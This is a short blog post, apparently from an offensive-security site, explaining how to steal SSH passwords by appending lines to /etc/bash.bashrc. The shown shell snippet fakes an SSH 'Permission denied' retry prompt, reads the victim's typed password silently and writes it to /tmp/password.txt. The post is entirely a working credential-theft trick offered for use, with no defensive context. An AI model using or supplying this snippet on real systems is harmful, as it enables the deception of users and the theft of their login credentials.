---
layout: post
title:  "Steal SSH password using bashrc"
categories: ssh password
summary: Use bashrc to steal SSH password
---

{% include instructions.md %}

### {{page.title}}

Modify bash.bashrc so it looks like first password went wrong and you need to write it again, but actually it steals victim’s password and adds it to a file
```shell
# nano /etc/bash.bashrc
```

Add these line to end of the bash.bashrc file
```shell
clear
echo "$(whoami)@$(hostname -I)'s password:"
echo "Permission denied, please try again."
read -s -p "$(whoami)@$(hostname -I)'s password: "  password
echo "$password" >> /tmp/password.txt
echo   
```